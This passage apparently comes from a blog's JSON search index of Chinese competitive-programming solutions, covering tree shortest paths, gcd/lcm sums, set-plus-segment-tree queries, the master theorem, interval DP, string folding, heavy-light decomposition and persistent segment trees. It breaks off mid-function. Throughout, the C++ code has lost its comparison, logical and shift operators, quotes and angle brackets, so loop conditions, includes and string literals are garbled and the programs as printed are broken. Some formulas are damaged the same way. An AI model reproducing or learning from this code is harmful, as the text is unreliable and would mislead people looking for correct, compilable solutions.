$\\sum\\limits_{i = 1}^{n} \\min (diss_i,dist_i)$。又由于题目给的是一棵树，所以其实距离就相当于普通的子树向父亲节点的转移。第一问的代码如下： void dfs (int u,int fa,ll *dis) for (int i = head[u];i;i = nxt[i]) int v = to[i]; if (v == fa) continue; dis[v] = dis[u] + val[i]; dfs (v,u,dis); dfs (s,0,dis1);dfs (t,0,dis2);for (int i = 1;i = n;++i) ansdis[i] = min (dis1[i],dis2[i]),ans += ansdis[i];printf (%lld ,ans); 第二问相当于是还原路径，再次跑两遍最短路，当跑到一个节点 $u$ 时，若发现 $ansdis_u$ 加上边权后恰好等于 $ansdis_v$，也就是说这是一个可能的还原方式，把这个点所在的边标记一下。 当所有点标记以后，尝试进行判断出入边。考虑第 $i$ 条双向边满足边的下标 $x,y$ 为 $2i,2i+1$ 时存在性质 $x \\oplus 1 = y,y \\oplus 1 = x$，所以当下标为奇数时相当于从起点 $s,t$ 的出边，在构造答案时需要注意出入恰好反向。于是我们便得到了第二问的代码： void solve (int u,int fa) for (int i = head[u];i;i = nxt[i]) int v = to[i]; if (v == fa) continue; if (min (dis1[v],dis2[v]) == ansdis[u] + val[i]) vis[v] = i;//能够还原时记录该点所在边 solve (v,u); solve (s,0);solve (t,0);for (int i = 1;i = n;++i)//利用双向边的性质进行构造 if (!vis[i]) continue; ty[vis[i] 1] = (vis[i] 1) ? 1 : 2;//注意恰好相反for (int i = 1;i n;++i) printf (%d,ty[i]);","categories":["Solution"]},{"title":"题解：CF1717E Madoka and The Best University","path":"/2022/09/03/CF1717E/","content":"看到题目，有三个变量，首先想到消参。由辗转相减法可知 $\\gcd (a,b) = \\gcd (a,a + b)$，又因为 $a + b + c = n$，所以 $a + b = n - c$，即 $\\gcd (a,b) = \\gcd (a,n - c)$。 令 $g = \\gcd (a,n - c)$，将题目所求进行转化，则有 $\\sum \\mathrm{lcm} (c,\\gcd (a,b)) = \\sum \\mathrm{lcm} (c,\\gcd (a,n - c))$。枚举 $c,g$，不难发现答案与 $a$ 的大小无直接联系，只与符合条件的 $a$ 的个数有关。由 $\\gcd$ 的定义可知，$\\gcd (\\frac{a}{g},\\frac{n - c}{g}) = 1$，也就是说符合条件的 $a$ 满足 $\\frac{a}{g}\\perp\\frac{n - c}{g}$，不难想到欧拉函数 $\\varphi(x)$ 表示与 $x$ 互质的数的个数。于是答案就变为 $\\sum \\limits_{g \\mid n - c}\\mathrm{lcm} (c,g) \\times \\varphi(\\frac{n - c}{g})$，预处理欧拉函数便可解决问题。 但是在编写代码的时候还需要注意一些细节，$a,b,c$ 都是正整数，所以枚举的时候 $c \\in [1,n - 2]$，枚举因数的时候要满足 $a n - c = a + b$，所以 $a = 1$ 的时候 $\\frac{n - c}{a}$ 应该舍去。 代码如下： #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;inline int read ();int n,cnt,ans,p[MAX],phi[MAX],flag[MAX];int gcd (int x,int y) return (!y) ? x : gcd (y,x % y);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read (); phi[1] = 1; for (int i = 2;i = n;++i) if (!flag[i]) p[++cnt] = i,phi[i] = i - 1; for (int j = 1;j = cnt;++j) if (i * p[j] n) break; flag[i * p[j]] = 1; if (i % p[j] == 0) phi[i * p[j]] = phi[i] * p[j]; break; phi[i * p[j]] = phi[i] * (p[j] - 1); for (int i = 1;i = n - 2;++i) int k = n - i; for (int j = 1;j * j = k;++j) if (k % j != 0) continue; ans += 1ll * i * j / gcd (i,j) * phi[k / j] % MOD; ans %= MOD; if (j != 1 k / j != j) ans += 1ll * i * k / j / gcd (i,k / j) * phi[j] % MOD,ans %= MOD; printf (%d ,ans); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"题解：CF19D Points","path":"/2022/08/29/CF19D/","content":"所有操作均建立在二维平面上，容易想到 STL 库的 set。将点的 $y$ 坐标放入到对应的集合 $x$ 中进行相应的操作。插入操作为 s[x].insert (y)，删除操作为 s[x].erase (y)，而查询操作需要从小到大遍历下标大于 $x$ 的集合，找到第一个不为空的集合且集合中存在一个元素大于 $y$。由题可知 $x,y$ 均较大，但是最多只有 $2 \\times 10^5$ 次插入，容易想到将 $x$ 进行离散化，所以查询操作可以写成： //对于所有 j 均满足大于 x （离散化后的编号）if (!s[j].empty () s[j].upper_bound (q[i].y) != s[j].end ()) // print the answer 综上，我们可以得到第一份代码，只放了主函数的部分： int main () n = read (); for (int i = 1;i = n;++i) scanf (%s,q[i].ty),q[i].x = read (),tmp[i] = q[i].x,q[i].y = read (); sort (tmp + 1,tmp + 1 + n); tot = unique (tmp + 1,tmp + n + 1) - tmp - 1; for (int i = 1;i = n;++i) q[i].id = lower_bound (tmp + 1,tmp + 1 + tot,q[i].x) - tmp;//离散化 for (int i = 1;i = n;++i) if (q[i].ty[0] == a) s[q[i].id].insert (q[i].y); else if (q[i].ty[0] == r) s[q[i].id].erase (q[i].y); else bool ok = 0; for (int j = q[i].id + 1;j = tot;++j) if (!s[j].empty () s[j].upper_bound (q[i].y) != s[j].end ()) ok = 1; printf (%d %d ,tmp[j],*s[j].upper_bound (q[i].y)); break;//找到最小的一个即可 if (!ok) puts (-1);//不存在就输出 -1 return 0; 容易看得出复杂度主要在查询操作上，最坏情况下可以达到 $O(n^2)$。由于要找到一个最小的答案，所以可以进行线段树上的二分。每一个叶子节点的存的是离散化后 $x$ 对应编号的集合的最大值，换句话说，如果最大值都不符题意，那么该集合中一定无解。 将 set 与线段树配合着使用，插入的同时将离散化后 $x$ 对应编号的集合的所对应的节点改为当前集合的最大值（可能不会发生变化），删除操作也是同理，但要注意删除后集合为空的情况。 查询操作通过线段树求得对应的离散化后的 $x$ 或者无解，然后再通过 set 里的函数求解，因此主要的难度在于如何写线段树的查询操作，进行分类讨论： 区间不存在或线段树的某一个区间的最大值小于 $y$，不符，直接返回 $-1$。 已经递归至一个大小为 $1$ 的符合题意的区间（退化成点），之间返回端点编号。 递归左区间，如果合法就返回左区间的递归值；否则再递归右区间。 综上所述，我们得到了时间复杂度为 $O(n \\log n)$ 的代码，一些重点在注释中有讲： #include iostream#include cstdio#include algorithm#include cmath#include cstring#include set#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 4e5 + 5;const int MOD = 1e9 + 7;inline int read ();int n,tot,cnt,k[MAX],tree[MAX 2]; struct node char ty[10]; int x,y; q[MAX];set int s[MAX];void modify (int cur,int l,int r,int x,int v);int query (int cur,int l,int r,int x,int y,int v);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read (); for (int i = 1;i = n;++i) scanf (%s,q[i].ty),q[i].x = read (),q[i].y = read (),k[++cnt] = q[i].x,k[++cnt] = q[i].y; sort (k + 1,k + 1 + cnt); tot = unique (k + 1,k + cnt + 1) - k - 1; for (int i = 1;i = n;++i)//x y 都进行了离散化 q[i].x = lower_bound (k + 1,k + 1 + tot,q[i].x) - k; q[i].y = lower_bound (k + 1,k + 1 + tot,q[i].y) - k;//y 进行离散化是因为存在 y = 0 的点 离散化后便于与空集合作区分 for (int i = 1;i = n;++i) if (q[i].ty[0] == a) s[q[i].x].insert (q[i].y),modify (1,1,tot,q[i].x,*(--s[q[i].x].end ()));//插入后查找最值 else if (q[i].ty[0] == r) s[q[i].x].erase (q[i].y); if (!s[q[i].x].size ()) modify (1,1,tot,q[i].x,0);//区间为空，直接更新成 0 else modify (1,1,tot,q[i].x,*(--s[q[i].x].end ()));//删除后查找最值 else int pos = query (1,1,tot,q[i].x + 1,tot,q[i].y); if (pos == -1) puts (-1);//无解 else printf (%d %d ,k[pos],k[*s[pos].upper_bound (q[i].y)]);//还原成原来的值后输出 return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;void modify (int cur,int l,int r,int x,int v)//单点更新 if (l == r) tree[cur] = v; return ; int mid = (l + r) 1; if (x = mid) modify (cur 1,l,mid,x,v); else modify (cur 1 | 1,mid + 1,r,x,v); tree[cur] = max (tree[cur 1],tree[cur 1 | 1]);//维护最大值int query (int cur,int l,int r,int x,int y,int v) if (tree[cur] = v || y l || x r) return -1;//无解 if (l == r) return l;//区间长度为 1 int mid = (l + r) 1,s = query (cur 1,l,mid,x,y,v); if (~s) return s;//有解 显然左区间的编号更小 return query (cur 1 | 1,mid + 1,r,x,y,v);//左区间无解在进行右区间的递归","categories":["Solution"]},{"title":"浅谈 $T(n) = a(\\lfloor\\frac{n}{b}\\rfloor) + f(n)$","path":"/2022/08/21/Time Complexity/","content":"主定理【master theorem】本文部分参考《算法导论》。相关证明由于过于复杂，已略去。 前言 $\\Theta$ 读作 theta，即等于。 $O$ 读作 big-oh，即小于等于。 $o$ 读作 small-oh，即小于。 $\\Omega$ 读作 big omega，即大于等于。 $\\omega$ 读作 small omega，即大于。 $T(n)$ 时间复杂度。 $f(n)$ 关于 $n$ 的函数。 若 $f(x)$ 多项式大于 $g(x)$，则存在实数 $e 0$，使得 $f(x)g (x) \\times x^e$。 若 $f(x)$ 渐进大于 $g(x)$，则存在实数 $c 0$和 $k$，使得对于任意 $n = k$ 有 $c\\times f(x) = g(x)$。 对于 $\\log n$，不需要弄清其具体的底数。原因在于 $\\lim \\limits_{n \\to \\infty}\\frac{\\log_x n}{\\log_y n} = \\frac{\\ln y}{\\ln x}(x ot = y)$。即 $\\log$ 级别的渐进意义是一样的。 主定理对于一个形如 $T(n) = aT(\\frac{n}{b}) + f(n)$ 的式子（令 $a \\ge 1,b 1$ 且为常数），有以下渐近界 ： \\begin{cases} T(n) = \\Theta (n^{\\log_b a}) \\text{ If }\\exists \\varepsilon > 0,f(n) = O(n^{\\log_b a - \\varepsilon})\\\\\\\\ T(n) = \\Theta (n^{\\log_b a}\\log n) \\text{ If }f(n) = \\Theta(n^{\\log_b a})\\\\\\\\ T(n) = \\Theta (f(n)) \\text{ If } \\exists \\varepsilon > 0,f(n) = \\Omega(n^{\\log_b a + \\varepsilon}) \\text{ and If } \\forall n \\to \\infty,\\exists c < 1, \\ aT(\\frac{n}{b}) \\le cf(n)\\\\ \\end{cases}简单的，我们可以描述成以下情况： T(n)= \\begin{cases} O(n^d),d > \\log_b a\\\\\\\\ O(n^d \\log n),d = \\log_b a\\\\\\\\ O(n^{\\log_b a}),d < \\log_b a\\\\ \\end{cases}例题 $T(n) = 2T(\\frac{n}{2}) + n$ \\because b = 2,a = 2,f(n) = \\Theta(n^{\\log_2 2}) = 1\\\\ \\therefore T(n) = \\Theta(n \\log n)\\\\ $T(n) = 9T(\\frac{n}{3}) + n$ \\because b = 3,a = 9,f(n) = n\\\\ \\because \\Theta (n^{\\log_b a}) = \\Theta (n^2),f(n) = O(n^{\\log_3 9 - \\varepsilon})= O(n^2) \\textit{ If }\\varepsilon = 1\\\\ \\therefore T(n) = \\Theta(n^2)\\\\ $T(n) = 3T(\\frac{n}{4}) + n \\log n$ \\because b = 4,a = 3,f(n) = n \\log n\\\\ \\because \\Theta (n^{\\log_b a}) = O (n^{0.793}),f(n) = \\Omega(n^{\\log_b a}) = \\Omega(n^{\\log_4 3 + \\varepsilon})\\textit{ If }\\varepsilon \\thickapprox 0.2\\\\ \\because n \\to \\infty,aT(\\frac{n}{b}) \\le cf(n) \\textit{ If } c = \\frac{3}{4}\\\\ \\therefore T(n) = \\Theta(n \\log n)\\\\ $T(n) = 2T(\\frac{n}{2}) + n \\log n$ 可以求出 $b = 2,a = 2,f(n) = n \\log n,\\Theta (n^{\\log_b a}) = O (n)$。看似是主定理的第三种情况，但是发现 $\\frac{f(n)}{n^{\\log_b a}} = \\log n n^\\varepsilon(\\varepsilon 0)$，也就是 $\\log n = o(n^\\varepsilon)$，即两者不同阶。 故只能采取递归树的方式解决，将叶子节点与非叶子节点分开计算最后答案是 $\\Theta(2^{\\log n}) + \\Theta(n \\sum_{i = 1}^{\\log n} 1) = \\Theta(n) + \\Theta(n\\frac{\\log n(1 + \\log n)}{2}) \\thickapprox O(n \\log^2 n)$。 总结 其中第一情况要求的小于是多项式意义下的小于，也就是 $f(n)$ 渐近小于 $n^{\\log_b a}$，即相差一个因子 $n^\\varepsilon$，其中 $\\varepsilon$ 是一个大于 $0$ 的常数。第三种情况同理，但多了一个“正则”的条件。 $T(n) = \\Theta (n^{\\log_b}\\log^{k + 1} n) \\text{ If }f(n) = \\Theta(n^{\\log_b a} \\log^k n),k \\ge 1$ 主定理并不能覆盖所有的情况，但是可以通过递归树的方式求解。","categories":["Algorithm"]},{"title":"题解：SP13105 MUTDNA - DNA","path":"/2022/08/18/SPOJ13105/","content":"第二种操作是从 $1$ 开始修改的，也就是修改一段前缀，考虑递推。由于操作可逆，所以我们可以转换为将读入的串变为全 A 串所需的最小变换次数。 设 $f_{i,0}$ 表示前 $i$ 个字符均为 A 时的最小变换次数，设 $f_{i,1}$ 表示前 $i$ 个字符均为 B 时的最小变换次数。在处理第 $i$ 个字符时，前 $i - 1$ 个字符只有全 A 或全 B 两种情况，而我们现在可以将前 $i$ 个字符变为全 A 或全 B。令第 $i$ 个字符是 A，进行分类讨论： $f_{i - 1,0} \\to f_{i,0}$ 不需要操作，直接在末尾添上 A。 $f_{i - 1,0} \\to f_{i,1}$ 添上 A 后将区间 $[1,i]$ 进行翻转。 $f_{i - 1,1} \\to f_{i,0}$ 将区间 $[1,i - 1]$ 进行翻转，之后添上 A。 $f_{i - 1,1} \\to f_{i,1}$ 将区间 $[1,i - 1]$ 进行翻转，之后将 A 变为 B 并添上。操作等价于 $f_{i,0} \\to f_{i,1}$。 若第 $i$ 个字符是 B 同理。最后的要求全为 A 串，答案也就是 $\\min (f_{n,0},f_{n,1} + 1)$。 由于 $f_{i,0},f_{i,1}$ 只与 $f_{i - 1,0},f_{i - 1,1}$ 有关，所以我们可以将 $f$ 数组的第一维滚掉，即空间上的一个优化。 最后代码如下： #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e6 + 5;const int MOD = 1e9 + 7;inline int read ();int n,f[2][2];int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read (); for (int i = 1;i = n;++i) char ch;scanf (%c,ch); if (ch == A) f[1][0] = min (f[0][0],f[0][1] + 1),f[1][1] = min (f[1][0],f[0][1]) + 1;//f[1][0] 之前已经算出，直接使用 else f[1][1] = min (f[0][1],f[0][0] + 1),f[1][0] = min (f[1][1],f[0][0]) + 1; f[0][0] = f[1][0],f[0][1] = f[1][1]; printf (%d ,min (f[0][0],f[0][1] + 1)); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"题解：P7914 [CSP-S 2021] 括号序列","path":"/2022/08/05/P7914/","content":"这是一道区间 dp，思维难度与实现难度都不小，主要的瓶颈在于如何不重不漏地转移（这要求仔细地读题）。 和题目一样，A 表示一个符合规范的超级括号序列，S 表示任意一个仅由不超过 $k$ 个字符 * 组成的非空字符串，即 *...*。以下就不再赘述字符的含义。 先将状态分成以下几类： $dp_{i,j,0}$ 表示 $[i,j]$ 的符合规范的超级括号序列的数量 $dp_{i,j,1}$ 表示 $[i,j]$ 的符合 (A) 的形式的数量 $dp_{i,j,2}$ 表示 $[i,j]$ 的符合 SA 的形式的数量 $dp_{i,j,3}$ 表示 $[i,j]$ 的符合 AS 的形式的数量 接下去就是状态转移的过程。 先预处理出一个布尔数组 $g$，若 $g_{i,j} = 1$ ，那么有 $[i,j]$ 为一个 $S$ 串。 对于 (A) 的形式，可以由 *...*，SA，AS 和 A 加上一对左右括号即可得到。也就是说若 $[i,j]$ 满足 (A) 的形式，也就有原字符串的第 $i$ 位为 ( 或 ?，第 $j$ 位为 ) 或 ?。转移为 $dp_{i,j,1} = g_{i + 1,j - 1} + dp_{i + 1,j - 1,0} + dp_{i + 1,j - 1,2} + dp_{i + 1,j - 1,3}$。相信大家读到这里会有一个疑问，若 $i + 1 = j$，那么会有 $i + 1 j - 1$，导致答案出错。很简单，由于 () 也合法，所以只需要进行一个特判即可。 对于 SA 的形式，由一段 S 和 A 组成，一次设置 $[i,j]$ 的断点 $k$ 来进行转移。转移方程为 $dp_{i,j,2} = \\sum_{k = i}^{r - 1} g_{i,k} \\times dp_{j + 1,r,2}$。只有在 $[i,k]$ 是 S 串时才可以被转移，用乘法便很好的解决了这个问题。 对于 AS 的形式大致与上一个相同，转移方程为 $dp_{i,j,3} = \\sum_{k = i}^{r - 1} g_{k + 1,r} \\times dp_{i,k,3}$。 最后是 $dp_{i,j,0}$ 的转移。$dp_{i,j,1}$ 肯定符合情况，之后需要通过两个小区间来得到大区间，也就是 AB 以及 ASB 的情况，但是需要考虑到重复计算的情况。直接令 A 串属于 (...) 的情况，这样就能去掉重复计算，因此有转移方程 $dp_{i,j,0} = dp_{i,j,1} + \\sum_{k = i}^{r - 1} dp_{i,k,1} \\times (dp_{k + 1,r,0} + dp_{k + 1,r,2})$。 因此最后的时间复杂度是 $O(n^3)$ 的，代码如下： #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 505;const int MOD = 1e9 + 7;int n,k;char str[MAX];ll dp[MAX][MAX][4];bool g[MAX][MAX];/*dp[l][r][0] 合法答案 最终答案即为 dp[1][n][0] dp[l][r][1] (A) dp[l][r][2] SA dp[l][r][3] AS*/bool check (int x,int y);int main () scanf (%d%d%s,n,k,str + 1); for (int i = 1;i = n;++i) for (int j = i;j = n;++j) if (j - i + 1 k) break; bool ok = 1; for (int k = i;k = j;++k) if (str[k] != * str[k] != ?) ok = 0; if (ok) g[i][j] = 1;//仅由 * 组成且不超过 k 个 for (int i = 1;i = n;++i) for (int l = 1;l = n;++l) int r = l + i; if (r n) break; if (check (l,r))//括号匹配 if (l == r - 1) dp[l][r][1] = 1;//特判 else dp[l][r][1] += (g[l + 1][r - 1] + dp[l + 1][r - 1][0] + dp[l + 1][r - 1][2] + dp[l + 1][r - 1][3]) % MOD; dp[l][r][0] += dp[l][r][1]; dp[l][r][0] %= MOD,dp[l][r][1] %= MOD; for (int k = l;k r;++k) dp[l][r][2] += g[l][k] * dp[k + 1][r][0]; dp[l][r][3] += dp[l][k][0] * g[k + 1][r]; dp[l][r][0] += dp[l][k][1] * (dp[k + 1][r][0] + dp[k + 1][r][2]) % MOD;//去重 所以把前面那个标记成 1 for (int p = 0;p 4;++p) dp[l][r][p] %= MOD; printf (%lld ,dp[1][n][0]); return 0;bool check (int x,int y) return ((str[x] == ( || str[x] == ?) (str[y] == ) || str[y] == ?));","categories":["Solution"]},{"title":"题解：UVA1630 串折叠 Folding","path":"/2022/07/28/UVA1630/","content":"本题是 P4302 [SCOI2003]字符串折叠 的强化版。 不难看出这是一个区间 dp，令 dp[i][j] 表示区间 $[l,r]$ 的最小长度。考虑两种操作： 合并两个小区间后变为一个大区间 将某个区间进行折叠 第一个操作，显然就是区间 dp 的套路方法，即： for (int k = l;k r;++k) dp[l][r] = min (dp[l][r],dp[l][k] + dp[k + 1][r]); 第二个操作，对于一个 $[l,r]$ 的字符串，若要被折叠成长度为 $k$ 的字符串，在执行的时候需要满足 $1 \\le k \\le r - l + 1$ 且 $k \\mid r - l +1$ 且 $\\forall i \\in [l,r - k], str[i] = str[i + k]$。符合要求，则可以转移 dp[l][r] = min (dp[l][r],2 + calc ((r - l + 1) / k) + dp[l][l + k - 1])。其中的 $2$ 即两个括号的长度，calc (x) 计算的是重复次数表示成字符串时的位数，dp[l][l + k - 1] 即循环节。 在得到最小长度后，由于需要输出合法的方案，所以我们在此基础上还要记录一些断点的信息，从而进行搜索。用两个数组分别记录第一和第二种的操作的断点，第一种操作记录断点的编号，第二种操作记录循环节的长度。由于一个区间的处理只进行一种操作，所以在标记时要把另外一种操作的断点设为 $0$。 在递归时，对于一个区间若两种断点均不存在，则直接输出这段区间；若是第一种操作的断点 $k$，则分别递归区间 $[l,k]$ 和 $[k + 1,r]$；若是第二种，则先输出左括号和重复的次数，递归循环节的区间，在输出右括号即可。 完整代码如下： #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x,y) memset (x,y,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 105;const int MOD = 1e9 + 7;char str[MAX];int n,dp[MAX][MAX],cut[MAX][MAX],fold[MAX][MAX];void check (int l,int r,int k);int calc (int num);void dfs (int l,int r);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); while (scanf (%s,str + 1) != EOF) n = strlen (str + 1); init (dp,INF);init (cut,0);init (fold,0);//多测清空！ for (int i = 1;i = n;++i) dp[1][i] = i,dp[i][i] = 1;//初始化 for (int i = 1;i = n;++i) for (int l = 1;l = n;++l) int r = i + l; if (r n) break; for (int k = 1;k = (r - l + 1) / 2;++k) check (l,r,k); for (int k = l;k r;++k) if (dp[l][k] + dp[k + 1][r] dp[l][r])//区间合并 dp[l][r] = dp[l][k] + dp[k + 1][r]; cut[l][r] = k; fold[l][r] = 0; //printf (%d ,dp[1][n]);// 最小操作次数 dfs (1,n); puts (); return 0;void check (int l,int r,int k) if ((r - l + 1) % k) return ; for (int i = l;i = r - k;++i) if (str[i] != str[i + k]) return ;//不合法 int s = 2 + calc ((r - l + 1) / k) + dp[l][l + k - 1]; if (s dp[l][r]) dp[l][r] = s; cut[l][r] = 0; fold[l][r] = k;//循环次数的记录 int calc (int num) int cnt = 0; while (num) num /= 10,++cnt; return cnt;void dfs (int l,int r) if (!cut[l][r] !fold[l][r]) for (int i = l;i = r;++i) printf (%c,str[i]);//直接输出即可 else if (cut[l][r]) dfs (l,cut[l][r]),dfs (cut[l][r] + 1,r);//分别递归两个区间 else printf (%d(,(r - l + 1) / fold[l][r]); dfs (l,l + fold[l][r] - 1);//继续递归循环节 printf ());","categories":["Solution"]},{"title":"一些关于数据结构的杂谈","path":"/2022/07/24/Data Structure/","content":"树链剖分P3384 【模板】轻重链剖分/树链剖分 作用 维护树上路径的相关信息。 常与线段树相结合。 性质 所有节点都属于且仅属于一条重链，重链将树完全剖分。 重链与子树内的 $\\texttt{dfs}$ 序连续。【这一个性质非常有用】 每一条路径最多被拆分成 $\\log n$ 条重链（向下经过一条轻边时，子树大小至少除以 $2$）。 一些定义 f[x] 节点 $x$ 的父亲。 sz[x] 节点 $x$ 对应的子树大小。 dep[x] 节点 $x$ 的深度（假定编号为 $r$ 的节点深度为 $1$）。 dfn[x] 节点 $x$ 的 $\\texttt{dfs}$ 序。 hson[x] 节点 $x$ 所对应的重儿子。 top[x] 节点 $x$ 所在的重链的顶部节点。 rk[x] $\\texttt{dfs}$ 序所对应的节点编号，即 rk[dfn[x]] = x。 两个 $\\texttt{dfs}$ 第一个分别求出 fa[x] sz[x] dep[x] hson[x]。 具体代码如下 ： void dfs1 (int u,int fa) sz[u] = 1; dep[u] = dep[fa] + 1; f[u] = fa; for (int i = head[u];i;i = nxt[i]) int v = to[i]; if (v == fa) continue; dfs1 (v,u); sz[u] += sz[v]; if (sz[hson[u]] sz[v]) hson[u] = v;//子块大的便是重儿子 第二个分别求出 top[x] dfn[x] rk[x]。 具体代码如下 ： void dfs2 (int u,int fa) if (hson[u]) top[hson[u]] = top[u]; dfn[hson[u]] = ++cnt; rk[cnt] = hson[u]; dfs2 (hson[u],u);//优先对重儿子进行剖分，从而保证重链上的 dfn 序连续 for (int i = head[u];i;i = nxt[i]) int v = to[i]; if (v == fa || top[v]) continue; top[v] = v;//单独以 v 作为重链的顶端 dfn[v] = ++cnt; rk[cnt] = v; dfs2 (v,v); 树上两点路径权值和的修改与查询 每次选择深度大的链往上跳，直到两点在同一条链上。由于链上的 $\\texttt{dfn}$ 连续，所以直接再用线段树（或树状数组）进行维护即可。 以查询为例 ： void upd (int x,int y,int v)// x - y 的最短路径上，所有点的权值均加上 v int fx = top[x],fy = top[y]; while (fx != fy) if (dep[fx] dep[fy]) swap (fx,fy),swap (x,y);//选择深度大的向上跳 modify (1,1,cnt,dfn[fx],dfn[x],v);//某一段链的更新 注意 f[x] 的 dfn 序更小 x = f[fx],fx = top[x]; if (dep[x] dep[y]) swap (x,y); modify (1,1,cnt,dfn[x],dfn[y],v);//最后 x 与 y 在同一条链上 完整代码 云剪贴板 拓展应用 求最近公共祖先。不断向上跳重链，当跳到同一条重链上时，深度较小的结点即为 $\\texttt{LCA}$。 核心代码就是上一模板题的查询操作的修改。 int LCA (int x,int y) int fx = top[x],fy = top[y]; while (fx != fy) if (dep[fx] dep[fy]) swap (fx,fy),swap (x,y); x = f[fx],fx = top[x]; if (dep[x] dep[y]) swap (x,y); return x; 可持久化线段树P3919 【模板】可持久化线段树 1（可持久化数组） 作用 可保留每一个历史版本。 实现一些强制在线的功能。 性质 每一次修改后所增加的节点数最大为 $\\log n$。 具有若干个根，且每一个根均可以构成一棵完整的线段树。 实现过程 只对进行修改的结点进行复制处理。 直接新开一块内存储存新节点，建树等同于新建节点。 对于每一个根，对应着一个版本，因此若要处理某一版本 $i$，访问或更新时直接使用 root[i] 即可。 其它过程与普通线段树差不多。 注意空间开到 N 5 差不多。 完整代码 #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e6 + 5;const int MOD = 1e9 + 7;inline int read ();int n,m,cnt,a[MAX],root[MAX 5];struct node int dl,dr,v; tree[MAX 5]; int make (int cur,int l,int r);int modify (int cur,int l,int r,int x,int val);int query (int cur,int l,int r,int x);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();m = read (); for (int i = 1;i = n;++i) a[i] = read (); root[0] = make (0,1,n);//初始的建树过程 for (int i = 1;i = m;++i) int k = read (),ty = read (),x = read (),y; if (ty == 1) y = read (); root[i] = modify (root[k],1,n,x,y); else printf (%d ,query (root[k],1,n,x)); root[i] = root[k];//保存当前版本 return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;int make (int cur,int l,int r) cur = ++cnt; if (l == r) tree[cur].v = a[l]; return cur; int mid = (l + r) 1; tree[cur].dl = make (tree[cur].dl,l,mid); tree[cur].dr = make (tree[cur].dr,mid + 1,r); return cur;int modify (int cur,int l,int r,int x,int val) tree[++cnt] = tree[cur];//新开一个节点 cur = cnt; if (l == r) tree[cur].v = val; return cur; int mid = (l + r) 1; if (x = mid) tree[cur].dl = modify (tree[cur].dl,l,mid,x,val); else tree[cur].dr = modify (tree[cur].dr,mid + 1,r,x,val); return cur;int query (int cur,int l,int r,int x) if (l == r) return tree[cur].v; int mid = (l + r) 1; if (x = mid) return query (tree[cur].dl,l,mid,x); else return query (tree[cur].dr,mid + 1,r,x); P3834 【模板】可持久化线段树 2 同 P1533 可怜的狗狗 和上题差不多，用 root[i] 表示范围为 $[1,i]$ 的一个版本，查询时用前缀和的思想进行线段树的相减。 即在求第 $k$ 小的数时，先判断是否在左子树内，是则递归；否则递归右子树并将问题变为求第 $k - x$ 小的数（$x$ 表示进行相减后的区间的数的个数）。 代码如下： #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 3e5 + 5;const int MOD = 1e9 + 7;inline int read ();struct T int l,r,sum; tree[MAX 5];int n,m,len,cnt,a[MAX],num[MAX],root[MAX]; int build (int cur,int l,int r);int modify (int cur,int l,int r,int x);int query (int l,int r,int dx,int dy,int k);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();m = read (); for (int i = 1;i = n;++i) a[i] = read (),num[i] = a[i]; sort (num + 1,num + 1 + n); len = unique (num + 1,num + n + 1) - num - 1; root[0] = build (1,1,len); for (int i = 1;i = n;++i) int x = lower_bound (num + 1,num + 1 + len,a[i]) - num; root[i] = modify (root[i - 1],1,len,x); for (int i = 1;i = m;++i) int x = read (),y = read (),k = read (); printf (%d ,num[query (1,len,root[x - 1],root[y],k)]); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;int build (int cur,int l,int r) cur = ++cnt; if (l == r) return cur; int mid = (l + r) 1; tree[cur].l = build (tree[cur].l,l,mid); tree[cur].r = build (tree[cur].r,mid + 1,r); return cur;int modify (int cur,int l,int r,int x) tree[++cnt] = tree[cur]; tree[cnt].sum = tree[cur].sum + 1; cur = cnt; if (l == r) return cur; int mid = (l + r) 1; if (x = mid) tree[cur].l = modify (tree[cur].l,l,mid,x); else tree[cur].r = modify (tree[cur].r,mid + 1,r,x); return cur; int query (int l,int r,int dx,int dy,int k) if (l == r) return l; int x = tree[tree[dy].l].sum - tree[tree[dx].l].sum;//线段树相减 int mid = (l + 